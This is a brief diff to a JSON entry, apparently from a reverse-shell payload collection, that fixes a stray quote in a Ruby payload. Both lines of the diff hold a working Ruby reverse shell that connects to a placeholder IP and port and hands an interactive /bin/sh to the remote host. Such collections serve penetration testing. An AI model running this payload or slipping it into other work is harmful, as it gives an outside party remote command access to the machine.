@@ -5,6 +5,6 @@
       "type": "reverse",
       "exec": "ruby"
     },
-    "payload": "require \"socket\";f=TCPSocket.open(\"[IP]\",[PORT]).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    "payload": "require \"socket\";f=TCPSocket.open(\"[IP]\",[PORT]).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)"
   }
 }
